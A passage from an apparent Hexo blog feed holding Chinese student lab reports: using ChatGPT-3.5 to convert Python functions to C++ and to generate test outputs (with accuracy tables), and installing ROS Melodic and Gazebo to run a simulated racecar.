<h4 id="Typora"><a href="#Typora" class="headerlink" title="Typora"></a>Typora</h4><p>Typora 应该是最好用的markdown编辑器之一了。不过Typora要付费购买（89元&#x2F;永久），也可以用vscode的插件来代替。（如果你是markdown语言大神的话</p>
<h3 id="继续"><a href="#继续" class="headerlink" title="继续"></a>继续</h3><p>接下来就要从零开始搭建个人网页了，首先从我们的主角Hexo开始。</p>
]]></content>
      <categories>
        <category>个人网页搭建</category>
      </categories>
      <tags>
        <tag>个人网页</tag>
      </tags>
  </entry>
  <entry>
    <title>嵌入式方向实践实验一</title>
    <url>/2024/12/15/%E5%B5%8C%E5%85%A5%E5%BC%8F%E6%96%B9%E5%90%91%E5%AE%9E%E8%B7%B5%E5%AE%9E%E9%AA%8C%E4%B8%80/</url>
    <content><![CDATA[<h3 id="实践一-利用大模型将python程序转换成C-程序-实验报告"><a href="#实践一-利用大模型将python程序转换成C-程序-实验报告" class="headerlink" title="实践一_ 利用大模型将python程序转换成C++程序 实验报告"></a>实践一_ 利用大模型将python程序转换成C++程序 实验报告</h3><h3 id="实验任务"><a href="#实验任务" class="headerlink" title="实验任务"></a>实验任务</h3><p>请大家将认领到的程序, 尝试借助大语言模型将本文件夹中的 Python 代码转换为 C++ 的代码。应该提 交: 1.原始python代码, 2.大模型输出的C++代码 (标注由哪个模型输出, 以及驱动大模型的prompt), 3.以 及手动修正后的C++代码(需要通过编译, 且可执行, 执行结果正确.) </p>
<p>输入的 Python 代码均由两部分组成，主要功能函数（函数名不确定，函数中含有功能说明注释）与测 试函数（ check(candidate) 函数）; 手动修正后的 C++ 代码由三部分组成，由主要功能函数（函数名 不确定，请手动将功能说明注释同样补充在其中, 粘贴过去即可）与主函数（ main 函数，用于调用主 要功能函数来进行测试，不需要包含原有 check(candidate) 中的所有用例）。</p>
<span id="more"></span>

<p> 可以自行设计与大语言模型交互的  prompt ，这里给出一些建议, 例如:</p>
<figure class="highlight mel"><table><tr><td class="code"><pre><span class="line">请将下列<span class="keyword">python</span>代码改成语义上等价的C++代码 (Please transfer the following <span class="keyword">python</span> code </span><br><span class="line">into semantically <span class="keyword">equivalent</span> C++ code):</span><br></pre></td></tr></table></figure>

<p>或者针对注释中的说明来构建prompt, 以 000_has_close_elements.py 为例:</p>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line">请按照以下要求来构造C++代码 (Please <span class="keyword">write</span> the C++ code that following the </span><br><span class="line">descriptions below):</span><br><span class="line"> <span class="string">&quot;&quot;</span><span class="comment">&quot; For a given list of integers, return a tuple consisting of a sum and a </span></span><br><span class="line">product of <span class="keyword">all</span> the integers in <span class="keyword">a</span> <span class="keyword">list</span>.</span><br><span class="line"> Empty sum should <span class="keyword">be</span> equal <span class="keyword">to</span> <span class="number">0</span> <span class="built_in">and</span> <span class="built_in">empty</span> product should <span class="keyword">be</span> equal <span class="keyword">to</span> <span class="number">1</span>.</span><br><span class="line"> &gt;&gt;&gt; sum_product([])</span><br><span class="line"> (<span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line"> &gt;&gt;&gt; sum_product([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>])</span><br><span class="line"> (<span class="number">10</span>, <span class="number">24</span>)</span><br><span class="line"> <span class="string">&quot;&quot;</span></span><br></pre></td></tr></table></figure>

<p>以上prompt仅供参考, 同学们如果有好的prompt可以尽情发挥, 如果prompt不好, 那么后面修正C++代 码的工作量就会比较大, 最坏情况下这个C++的转换就全部是手工完成的. 即使如此, 只要最终手动修正的 C++代码完全正确, 这部分实验就会给分</p>
<h3 id="实验过程"><a href="#实验过程" class="headerlink" title="实验过程"></a>实验过程</h3><p>压缩包中包含python代码，模型给出的代码（该代码文件名包含后缀_unmodified），以及手工修改后的代码；</p>
<p>使用的python代码编号为121-125，如下：</p>
<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20231015001256489.png" alt="image-20231015001256489"></p>
<p>使用的模型为<code>chatgpt3.5</code>；</p>
<p>驱动大模型的prompt为：</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">请将以下python代码改成语义上相等的C++代码，原来的python代码包含一个功能函数和一个测试函数（check），新的C++代码请包含功能函数和主函数（main函数，调用功能函数进行测试）（注意代码中含有注释，可以用来帮助理解，但新的代码不需要携带这些注释）：</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">python code</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure>

<p>模型给出的cpp代码基本可用，除了以下两个问题：</p>
<ol>
<li><p>未包含头文件 &lt;assert.h&gt; 导致无法识别`assert`</p>
</li>
<li><p>c++中 `assert` 宏只接受一个条件表达式，不能直接比较复杂的数据结构，因此模型给出的以下类似代码会报错：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="built_in">assert</span>(result1 == std::vector&lt;std::string&gt;&#123;<span class="string">&quot;Hello&quot;</span>, <span class="string">&quot;world!&quot;</span>&#125;);</span><br></pre></td></tr></table></figure></li>
</ol>
<p>手工给出的修改方案为：</p>
<ol>
<li>增添头文件&lt;assert.h&gt;</li>
<li>使用if语句替代assert来比较复杂的数据结构</li>
</ol>
<p>在修改这两个错误后，代码可以编译运行，并无报错。</p>
]]></content>
      <categories>
        <category>嵌入式方向</category>
      </categories>
      <tags>
        <tag>LLM</tag>
      </tags>
  </entry>
  <entry>
    <title>嵌入式方向实践实验三</title>
    <url>/2024/12/15/%E5%B5%8C%E5%85%A5%E5%BC%8F%E6%96%B9%E5%90%91%E5%AE%9E%E8%B7%B5%E5%AE%9E%E9%AA%8C%E4%B8%89/</url>
    <content><![CDATA[<h2 id="实践三-通过LLM生成测试用例输出-实验报告"><a href="#实践三-通过LLM生成测试用例输出-实验报告" class="headerlink" title="实践三_通过LLM生成测试用例输出 实验报告"></a>实践三_通过LLM生成测试用例输出 实验报告</h2><h3 id="实验任务"><a href="#实验任务" class="headerlink" title="实验任务"></a>实验任务</h3><p>本次实践的主要任务是模拟在没有标准代码的情况下，通过将测试用例输入（实践二得到的）与功能说明注释交给大语言模型，让其生成一系列的测试用例输出，以评估大语言模型在解析能力与计算能力， 同时连同实践二的内容一起，探索该借助大语言模型生成完整测试用例集的方法的可行性。</p>
<p> 而大语言模型基于测试用例输入与功能说明注释所生成的输出并不一定是正确的，因此需要检查其生成的输出（即以实践一所转换的 Cpp 代码运行测试用例输入来核对其输出是否正确），并将正确的输出作为最终的测试用例输出，也请记录大语言模型生成的测试用例输出的准确率，由于大语言模型的不稳定性，在评估准确率时，应用相同的提示语多次向大语言模型提问（无上下文，开新的对话框提问才算为多次），取平均值，本次实践要求每份代码生成测试用例输出时至少重复提问 3 次，方可评估准确率。 </p>
<p>本次实践的成果要求与前两次实践类似，为各份代码各个输入所对应的测试用例输出（由大语言模型生成的多份 + 由程序跑出来的一份），与实验报告。实验报告需包含你所设计的提示语（prompt）与大语言模型对话的截图（两三张即可），并记录下大语言模型生成的测试用例输出的准确率（请按照上述要求重复生成后再计算准确率）。</p>
<span id="more"></span>

<p>举例 ：以下仍旧以  008_sum_product.cpp 举例（下简称  008 ），在成果中期望得到的测试用例输出的格式如下：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// other codes ...</span></span><br><span class="line"> <span class="function">std::tuple&lt;<span class="type">int</span>, <span class="type">int</span>&gt; <span class="title">sum_product</span><span class="params">(<span class="type">const</span> std::vector&lt;<span class="type">int</span>&gt;&amp; numbers)</span> </span>&#123;</span><br><span class="line"> <span class="comment">/*</span></span><br><span class="line"><span class="comment"> For a given list of integers, return a tuple consisting of a sum and a </span></span><br><span class="line"><span class="comment">product of all the integers in a list.</span></span><br><span class="line"><span class="comment"> Empty sum should be equal to 0 and empty product should be equal to 1.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"> <span class="comment">// other codes ...</span></span><br><span class="line"> &#125;</span><br><span class="line"> <span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"> std::vector&lt;std::vector&lt;<span class="type">int</span>&gt;&gt; cases = &#123;&#123;&#125;, &#123;<span class="number">1</span>&#125;, &#123;<span class="number">1</span>, <span class="number">2</span>&#125;&#125;;</span><br><span class="line"> std::tuple&lt;<span class="type">int</span>, <span class="type">int</span>&gt; result;</span><br><span class="line"> <span class="comment">// 以下为 LLM 根据 cases 与 commment 生成的测试用例输出，可能并不正确</span></span><br><span class="line">std::vector&lt;std::tuple&lt;<span class="type">int</span>, <span class="type">int</span>&gt;&gt; llm_outs_1 = &#123;&#123;<span class="number">0</span>, <span class="number">1</span>&#125;, &#123;<span class="number">1</span>, <span class="number">1</span>&#125;, &#123;<span class="number">3</span>, <span class="number">3</span>&#125;&#125;;</span><br><span class="line"> std::vector&lt;std::tuple&lt;<span class="type">int</span>, <span class="type">int</span>&gt;&gt; llm_outs_2 = &#123;&#123;<span class="number">0</span>, <span class="number">1</span>&#125;, &#123;<span class="number">1</span>, <span class="number">1</span>&#125;, &#123;<span class="number">3</span>, <span class="number">2</span>&#125;&#125;;</span><br><span class="line"> std::vector&lt;std::tuple&lt;<span class="type">int</span>, <span class="type">int</span>&gt;&gt; llm_outs_3 = &#123;&#123;<span class="number">0</span>, <span class="number">1</span>&#125;, &#123;<span class="number">1</span>, <span class="number">1</span>&#125;, &#123;<span class="number">3</span>, <span class="number">2</span>&#125;&#125;;</span><br><span class="line"> <span class="comment">// 以下为程序运行 cases 生成的测试用例输出，一定是正确的，用于检验 LLM 生成的测试用例输</span></span><br><span class="line">出的准确率</span><br><span class="line">std::vector&lt;std::tuple&lt;<span class="type">int</span>, <span class="type">int</span>&gt;&gt; expected_outs = &#123;&#123;<span class="number">0</span>, <span class="number">1</span>&#125;, &#123;<span class="number">1</span>, <span class="number">1</span>&#125;, &#123;<span class="number">3</span>, <span class="number">2</span>&#125;&#125;;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">auto</span> i = <span class="number">0</span>; i &lt; cases.<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line"> result = <span class="built_in">sum_product</span>(cases[i]);</span><br><span class="line"> <span class="built_in">assert</span>(result == expected_outs[i]);</span><br><span class="line"> <span class="built_in">assert</span>(result == llm_outs_1[i]);</span><br><span class="line"> <span class="built_in">assert</span>(result == llm_outs_2[i]);</span><br><span class="line"> <span class="built_in">assert</span>(result == llm_outs_3[i]);</span><br><span class="line"> <span class="comment">// 由于上述假设的 LLM 第一次生成的第三个测试用例输出不正确，所以运行到  i == 3 程</span></span><br><span class="line">序会异常退出</span><br><span class="line"><span class="comment">// 那么这份测试用例输出的生成准确率为 8/9 = 88.9%</span></span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="实验报告"><a href="#实验报告" class="headerlink" title="实验报告"></a>实验报告</h3><p>使用的大模型为<strong>chatgpt3.5</strong>；</p>
<p>以下为设计的<strong>prompt</strong>示例：</p>
<figure class="highlight actionscript"><table><tr><td class="code"><pre><span class="line">我现在给你一个程序的功能说明注释，以及该程序的一些测试用例输入，请你根据这些测试用例输入生成对应的测试用例输出。每一行代表一个测试用例输入。</span><br><span class="line">以下是程序的功能说明注释： </span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">    Given a positive integer n, return a sorted list that has the odd numbers in collatz sequence.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    The Collatz conjecture is a conjecture in mathematics that concerns a sequence defined</span></span><br><span class="line"><span class="comment">    as follows: start with any positive integer n. Then each term is obtained from the</span></span><br><span class="line"><span class="comment">    previous term as follows: if the previous term is even, the next term is one half of</span></span><br><span class="line"><span class="comment">    the previous term. If the previous term is odd, the next term is 3 times the previous</span></span><br><span class="line"><span class="comment">    term plus 1. The conjecture is that no matter what value of n, the sequence will always reach 1.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    Note:</span></span><br><span class="line"><span class="comment">        1. Collatz(1) is [1].</span></span><br><span class="line"><span class="comment">        2. returned list sorted in increasing order.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    For example:</span></span><br><span class="line"><span class="comment">    get_odd_collatz(5) returns [1, 5] # The collatz sequence for 5 is [5, 16, 8, 4, 2, 1], so the odd numbers are only 1, and 5.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">以下是一组测试用例输入：</span><br><span class="line"><span class="number">8</span>；</span><br><span class="line"><span class="number">14</span>；</span><br><span class="line"><span class="number">5</span>；</span><br><span class="line"><span class="number">12</span>；</span><br><span class="line"><span class="number">1</span></span><br></pre></td></tr></table></figure>



<p>每份程序共有5份测试用例输入，应用相同的提示语向大语言模型提问3次，并且每次都无上下文，因此总共生成的测试用例输出为3*5&#x3D;15个，评估的<strong>准确率</strong>如下：</p>
<table>
<thead>
<tr>
<th>程序名</th>
<th>正确</th>
<th>总计</th>
<th>正确率</th>
</tr>
</thead>
<tbody><tr>
<td>121_solution</td>
<td>7</td>
<td>15</td>
<td>46.7%</td>
</tr>
<tr>
<td>122_add_elements</td>
<td>7</td>
<td>15</td>
<td>46.7%</td>
</tr>
<tr>
<td>123_get_odd_collatz</td>
<td>7</td>
<td>15</td>
<td>46.7%</td>
</tr>
<tr>
<td>124_valid_date</td>
<td>12</td>
<td>15</td>
<td>80.0%</td>
</tr>
<tr>
<td>125_split_words</td>
<td>11</td>
<td>15</td>
<td>73.3%</td>
</tr>
</tbody></table>
<p>以下为与大模型对话的部分截图（内容为大语言模型的3次回答）：</p>
<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20231211224003828.png" alt="image-20231211224003828"></p>
<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20231211224010866.png" alt="image-20231211224010866"></p>
<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20231211224024589.png" alt="image-20231211224024589"></p>
<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20231211224036050.png" alt="image-20231211224036050"></p>
]]></content>
      <categories>
        <category>嵌入式方向</category>
      </categories>
      <tags>
        <tag>LLM</tag>
      </tags>
  </entry>
  <entry>
    <title>嵌入式方向实践 小车实验报告</title>
    <url>/2024/12/15/%E5%B5%8C%E5%85%A5%E5%BC%8F%E6%96%B9%E5%90%91%E5%AE%9E%E8%B7%B5%20%E5%B0%8F%E8%BD%A6%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/</url>
    <content><![CDATA[<h2 id="嵌入式方向实践-小车实验报告"><a href="#嵌入式方向实践-小车实验报告" class="headerlink" title="嵌入式方向实践 小车实验报告"></a>嵌入式方向实践 小车实验报告</h2><h3 id="实验任务"><a href="#实验任务" class="headerlink" title="实验任务"></a>实验任务</h3><h4 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h4><p>主要学习和考核以ROS为主的机器人相关知识、非常符合目前机器人产业界的人才需求，同时其更高的技术门槛，以及更激烈的对抗性。</p>
<p>为保证线上比赛的公平性，智能车室外光电组线上仿真比赛平台统一用「Gazebo」。赛道模型和无人车三维模型统一提供。线上比赛需要先把赛道模型导入Gazebo，采用ROS中建地图的方式构建赛道地图，通过自主导航算法实现无人车完成从起到到终点的运动。仿真平台的传感器可以使用IMU，激光雷达或摄像头，仿真平台自主导航算法不限。</p>
<span id="more"></span>

<p>赛道模型不允许修改。赛道示意图如下</p>
<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241215154416407.png" alt="image-20241215154416407"></p>
<p>统一使用提供的仿真车模型。仿真车模型的示意图如下：</p>
<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241215154424244.png" alt="image-20241215154424244"></p>
<p>仿真车模型自带传感器如下：</p>
<p>​	IMU ；激光雷达； 深度摄像头</p>
<p>仿真车模型如下方面禁止修改：</p>
<p>​	尺寸大小；自带传感器参数；无人车质量；无人车中各部位的转动惯量矩阵；碰撞系数</p>
<p>关于碰撞，线上仿真比赛赛道中会有锥桶等障碍物，车模运行时要避开障碍物，否则会有相应处罚，障碍物位置是随机的，会在赛前公布。赛道中的锥桶采用的是Gazebo models中的标准锥桶模型。</p>
<p>比赛时，仿真车根据提供的统一地图自主导航，避开障碍物，从赛道起点跑到终点，记录比赛完成时间，作为线上仿真比赛的成绩。</p>
<h4 id="比赛违规说明"><a href="#比赛违规说明" class="headerlink" title="比赛违规说明"></a>比赛违规说明</h4><p>1、车模碰触到锥桶，加罚5s</p>
<p>2、车模碰触到赛道围栏，加罚5s</p>
<p>3、车模碰触到锥桶或赛道围栏后停止运行，计比赛失败</p>
<p>4、车模在赛道中停止运行，计比赛失败</p>
<p>5、为了考查参赛队员在传感器数据融合方面的能力，在Gazebo仿真比赛中，禁止使用Gazebo直接发布无人车的精准位置消息（odometry）。</p>
<p><a href="https://blog.csdn.net/Lovely_him/article/details/107948765">https://blog.csdn.net/Lovely_him&#x2F;article&#x2F;details&#x2F;107948765</a>。</p>
<h4 id="综合实践说明"><a href="#综合实践说明" class="headerlink" title="综合实践说明"></a>综合实践说明</h4><p>采用ROS中建地图的方式构建赛道地图，通过自主导航算法实现无人车完成从起点到终点的运动。仿真平台的传感器可以使用IMU，激光雷达或摄像头，仿真平台自主导航算法不限。</p>
<p>统一提供已经构建好的竞赛地图和车模。车模参数和地图参数不得私自修改。车模根据构建好的地图自主导航，避开锥桶障碍物，从赛道起点跑到终点，记录完成时间，根据完成时间进行成绩排名。</p>
<h3 id="实验报告"><a href="#实验报告" class="headerlink" title="实验报告"></a>实验报告</h3><h4 id="一-创建虚拟机"><a href="#一-创建虚拟机" class="headerlink" title="一 创建虚拟机"></a>一 创建虚拟机</h4><ol>
<li><p>使用Orcale VM VirtualBox创建一个新的虚拟机，基本配置如下：</p>
<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20231223005528730.png" alt="image-20231223005528730"></p>
</li>
</ol>
<p>​	2. 虚拟机系统为ubuntu-18.04.06</p>
<h4 id="二-安装ROS-melodic"><a href="#二-安装ROS-melodic" class="headerlink" title="二 安装ROS-melodic"></a>二 安装ROS-melodic</h4><p>​	以下内容参考了：</p>
<p>​	ros-racecar.pdf</p>
<p>​	<a href="https://wiki.ros.org/melodic/Installation/Ubuntu">melodic&#x2F;Installation&#x2F;Ubuntu - ROS Wiki</a></p>
<p>​	<a href="https://blog.csdn.net/qq_44830040/article/details/106049992">Ubuntu18.04安装ROS Melodic（详细，亲测安装完成，有清晰的截图步骤）_ubuntu 18 ros melodic-CSDN博客</a></p>
<p>​	<a href="https://blog.csdn.net/hxj0323/article/details/121215992">ROS Melodic 安装必成功流程+避坑指南（超详细）-CSDN博客</a></p>
<ol>
<li><p>更换源服务器为南京大学镜像，在“软件和更新”中可以找到：</p>
<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20231222174905401.png" alt="image-20231222174905401"></p>
</li>
<li><p>输入以下指令，将ROS软件仓库的信息添加到Ubuntu系统的APT源列表中：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> sh -c <span class="string">&#x27;echo &quot;deb http://packages.ros.org/ros/ubuntu $(lsb_release -sc) main&quot; &gt; /etc/apt/sources.list.d/ros-latest.list&#x27;</span> </span><br></pre></td></tr></table></figure>
</li>
<li><p>添加两个密钥（来自ros-racecar.pdf)：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt-key adv --keyserver hkp://ha.pool.sks-keyservers.net --recv-key 421C365BD9FF1F717815A3895523BAEEB01FA116</span><br></pre></td></tr></table></figure>

<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt-key adv --keyserver hkp://ha.pool.sks-keyservers.net --recv-key F42ED6FBAB17C654</span><br></pre></td></tr></table></figure>

<p>结果遇到了报错（可能是公钥服务器的问题，也可能是密钥有问题）：</p>
<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20231222175853498.png" alt="image-20231222175853498"></p>
<p>上网查询后，改为使用以下命令：        </p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt-key adv --keyserver <span class="string">&#x27;hkp://keyserver.ubuntu.com:80&#x27;</span> --recv-key C1CF6E31E6BADE8868B172B4F42ED6FBAB17C654</span><br></pre></td></tr></table></figure>

<p>成功，显示如下：</p>
<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20231222180151569.png" alt="image-20231222180151569"></p>
</li>
<li><p>更新软件列表</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt-get update</span><br></pre></td></tr></table></figure>
</li>
<li><p>安装ros-melodic桌面完整版， 包含 ROS、rqt、rviz、机器人通用库、2D&#x2F;3D 模拟器、导航以及 2D&#x2F;3D 感知包：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt install ros-melodic-desktop-full</span><br></pre></td></tr></table></figure>
</li>
<li><p>添加环境变量</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;source /opt/ros/melodic/setup.bash&quot;</span> &gt;&gt; ~/.bashrc</span><br><span class="line"><span class="built_in">source</span> ~/.bashrc</span><br></pre></td></tr></table></figure>
</li>
<li><p>安装依赖</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt install python-rosdep python-rosinstall python-rosinstall-generator python-wstool build-essential</span><br></pre></td></tr></table></figure>
</li>
<li><p>初始化rosdep</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> rosdep init</span><br></pre></td></tr></table></figure>

<p>看到以下内容说明成功：</p>
<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20231222182045717.png" alt="image-20231222182045717"></p>
<p>然后输入：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">rosdep update</span><br></pre></td></tr></table></figure>

<p>结果报错了：</p>
<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20231222182303433.png" alt="image-20231222182303433"></p>
<p>大概是网络问题，多次执行rosdep update命令可能可以解决（本人执行了快二十遍才成功）。</p>
<p>像下面这样说明成功了：</p>
<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20231222193402720.png" alt="image-20231222193402720"></p>
</li>
<li><p>测试：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">roscore</span><br></pre></td></tr></table></figure>

<p>结果是以下内容，想执行install python-roslaunch也失败：</p>
<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20231222193729221.png" alt="image-20231222193729221"></p>
</li>
</ol>
<p>​		参考<a href="https://blog.csdn.net/tom17/article/details/107748686">ROS安装问题： “Command ‘roscore‘ not found, but can be installed with: sudo apt install python-roslaunch“-CSDN博客</a>解决了，但是这个解决办法总感觉有点奇怪。</p>
<h4 id="三-运行racecar"><a href="#三-运行racecar" class="headerlink" title="三 运行racecar"></a>三 运行racecar</h4><ol>
<li><p>使用虚拟文件夹将准备好的代码放进虚拟机里，并移动至&#x2F;~目录下。</p>
</li>
<li><p>初始化工作空间，给的代码好像是ros kinetic版本的，因此先将src&#x2F;CMakeLists.txt中的kinetic改成melodic。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> ~/racecar_ws/src</span><br><span class="line">catkin_init_workspace</span><br></pre></td></tr></table></figure>

<p>然后它显示 File “&#x2F;home&#x2F;jinqq&#x2F;racecar_ws&#x2F;src&#x2F;CMakeLists.txt” already exists，这个指令就跳过了。</p>
</li>
<li><p>编译源代码，先回到racecar_ws中</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">catkin_make</span><br></pre></td></tr></table></figure>

<p>结果遇到以下问题：</p>
<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20231222203853820.png" alt="image-20231222203853820"></p>
<p>执行权限的问题，输入以下添加权限：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> <span class="built_in">chmod</span> -R a+rwx * </span><br></pre></td></tr></table></figure>

<p>结果又报错：</p>
<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20231222233216409.png" alt="image-20231222233216409"></p>
<p>好像是符号格式的问题，太麻烦了，直接把CMakeLists里指向的&#x2F;opt&#x2F;ros&#x2F;melodic&#x2F;share&#x2F;catkin&#x2F;cmake&#x2F;toplevel.cmake复制进CMakeLists算了…也就是把CMakeLists里的内容变为toplevel.cmake的内容。</p>
<p>重新执行catkin_make后，会发现报错找不到包，例如：</p>
<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20231223002340928.png" alt="image-20231223002340928"></p>
<p>这是缺少包导致的，首先输入以下命令安装这些包（来自ros-racecar.pdf)：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt-get install ros-melodic-driver-base</span><br><span class="line"><span class="built_in">sudo</span> apt-get install ros-melodic-ackermann-msgs</span><br><span class="line"><span class="built_in">sudo</span> apt-get install ros-melodic-controller-manager</span><br><span class="line"><span class="built_in">sudo</span> apt-get install ros-melodic-gazebo-ros-control</span><br><span class="line"><span class="built_in">sudo</span> apt-get install ros-melodic-effort-controllers</span><br><span class="line"><span class="built_in">sudo</span> apt-get install ros-melodic-joint-state-controller</span><br><span class="line"><span class="built_in">sudo</span> apt-get install ros-melodic-rtabmap-ros</span><br><span class="line"><span class="built_in">sudo</span> apt-get install ros-melodic-move-base</span><br><span class="line"><span class="built_in">sudo</span> apt-get install ros-melodic-map-server</span><br><span class="line"><span class="built_in">sudo</span> apt-get install ros-melodic-teb-local-planner</span><br><span class="line"><span class="built_in">sudo</span> apt-get install ros-melodic-global-planner</span><br></pre></td></tr></table></figure>

<p>再次尝试catkin_make后，发现还报错找不到OpenCV这个包，处理方法比较特殊，参考了<a href="https://blog.csdn.net/weixin_46250367/article/details/107124979">OpenCV找不到config.cmake（简单直接的解决方法）：Could not find a package configuration file provided by “OpenCV“_opencvconfig.cmake-CSDN博客</a>，如下：</p>
<p>首先进入根目录中，然后搜索opencvconfig，如下：<img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20231223002917135.png" alt="image-20231223002917135"></p>
<p>找到位置后，再看报错的是哪个CMakeLists，发现是racecar_ws&#x2F;src&#x2F;racecar_gazebo下的CMakeLists.txt ，打开该文件，在find_package(….)前面加入（或修改）set(OpenCV_DIR xxx) ，其中xxx为搜索找到的位置，例如改成下面这样：</p>
<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20231223003433085.png" alt="image-20231223003433085"></p>
<p>这时候再catkin_make，应该成功了。</p>
</li>
<li><p>添加环境变量：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;source ~/racecar_ws/devel/setup.bash&quot;</span> &gt;&gt; ~/.bashrc</span><br><span class="line"></span><br><span class="line"><span class="built_in">source</span> ~/.bashrc</span><br></pre></td></tr></table></figure>
</li>
<li><p>打开一个新的终端，启动ros环境：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">roscore</span><br></pre></td></tr></table></figure>
</li>
<li><p>再打开一个新的终端，启动gazebo地图：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> ~/racecar_ws/</span><br><span class="line">roslaunch racecar_gazebo racecar_runway_navigation.launch</span><br></pre></td></tr></table></figure>

<p>gazebo 启动可能需要一小会，此时不要进行其他操作，不然 gazebo 容易崩溃。</p>
<p>启动成功后会如下显示：（给我卡闷了）</p>
<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20231223004524476.png" alt="image-20231223004524476"></p>
</li>
<li><p>再打开一个新的终端，启动rviz</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> ~/racecar_ws/</span><br><span class="line">roslaunch racecar_gazebo racecar_rviz.launch</span><br></pre></td></tr></table></figure>

<p>启动成功后会如下显示：</p>
<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20231223004947552.png" alt="image-20231223004947552"></p>
</li>
</ol>
]]></content>
      <categories>
        <category>嵌入式方向</category>
      </categories>
      <tags>
        <tag>嵌入式</tag>
      </tags>
  </entry>
  <entry>
    <title>嵌入式方向实践实验二</title>
    <url>/2024/12/15/%E5%B5%8C%E5%85%A5%E5%BC%8F%E6%96%B9%E5%90%91%E5%AE%9E%E8%B7%B5%E5%AE%9E%E9%AA%8C%E4%BA%8C/</url>
